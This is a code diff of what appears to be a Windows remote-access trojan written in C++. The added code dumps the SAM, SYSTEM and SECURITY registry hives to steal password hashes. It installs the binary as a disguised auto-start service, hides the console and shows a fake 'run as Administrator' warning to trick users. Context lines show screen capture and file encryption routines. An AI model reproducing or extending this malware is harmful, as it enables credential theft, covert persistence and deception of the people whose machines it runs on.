@@ -1,3 +1,4 @@
+#include "httplib.h"
 #include <iostream>
 #include <Windows.h>
 #include <fstream>
@@ -7,8 +8,11 @@
 #include <ctime>
 #include <stdio.h>
 #include "base64.cpp"
+#include <Iphlpapi.h>
+#include <Assert.h>
+#pragma comment(lib, "iphlpapi.lib")
 
-
+using namespace httplib;
 using namespace std;
 
 string ra_RunCommand(string ra_cmd);
@@ -22,28 +26,7 @@ string convertToString(char* a, int size)
     }
     return s;
 }
-/*
-std::wstring s2ws(const std::string& str)
-{
-    int size_needed = MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), NULL, 0);
-    std::wstring wstrTo(size_needed, 0);
-    MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), &wstrTo[0], size_needed);
-    return wstrTo;
-}
 
-void ra_Startup(int argc, char** argv) {
-    string ra_copy1 = "mkdir C:\\Users\\Public\\AppData\\Roaming\\Microsoft\\Windows\\" ;
-    string ra_copy2 = "copy " + convertToString(argv[0], sizeof(argv[0])) + " C:\\Users\\Public\\AppData\\Roaming\\Microsoft\\Windows\\";
-    ra_RunCommand(ra_copy1);
-    ra_RunCommand(ra_copy2);
-    std::wstring progPath = L"C:\\Users\\Public\\AppData\\Roaming\\Microsoft\\Windows\\"+ s2ws(convertToString(argv[0], sizeof(argv[0])));
-    HKEY hkey = NULL;
-    LONG createStatus = RegCreateKey(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey); //Creates a key       
-    LONG status = RegSetValueEx(hkey, L"MyApp", 0, REG_SZ, (BYTE*)progPath.c_str(), (progPath.size() + 1) * sizeof(wchar_t));
-
-
-}
-*/
 
 void ra_CapruteScreenAndSaveToFile()
 {
@@ -136,10 +119,65 @@ void ra_encryptFile(string filename, string key) {
     ra_RunCommand("del /f test.txt");
 }
 
+void ra_DumpHash() {
+    cout << ra_RunCommand("reg save HKLM\\SAM sam.save");
+    Sleep(100);
+    cout << ra_RunCommand("reg save HKLM\\SYSTEM system.save");
+    Sleep(100);
+    cout << ra_RunCommand("reg save HKLM\\SECURITY security.save");
+    Sleep(100);
+
+}
+
+void ra_Startup(string Raname) {
+    cout << ra_RunCommand("copy "+Raname+" C:\\Windows\\imtro.exe");
+    Sleep(100);
+    cout << ra_RunCommand("sc create imtro binpath=C:\\Windows\\imtro.exe start=auto");
+    Sleep(100);
+}
+
+
+
+int ra_StartupCheck() {
+    string racheck = ra_RunCommand("sc query imtro");
+    if (racheck[0] == '['){
+        return 0;
+    }
+    else {
+        return 1;
+    }
+}
+
+string ra_Listdir(string dir) {
+    return ra_RunCommand("dir /b "+dir);
+}
+
 
 int main(int argc, char** argv)
-{   
-    cout<< base64_encode("HELLO") << endl;
+{
+
+    /*
+    httplib::Client cli("www.google.com", 80);
+
+    if (auto res = cli.Get("/")) {
+        if (res->status == 200) {
+            cout << res->body << endl;
+        }
+    } else {
+        auto err = res.error();
+    }
+    */
+    /*
+    Server svr;
+    
+    svr.Get("/hi", [](const Request& req, Response& res) {
+        res.set_content("Hello World!", "text/plain");
+        });
+
+    svr.listen("localhost", 1234);
+    */
+    HideConsole();
+    MessageBoxW(NULL, L"Insufficient privileges, Please Run as an Administrator", L"Warning", MB_ICONEXCLAMATION | MB_OK);
     system("PAUSE");
     return 0;
 }
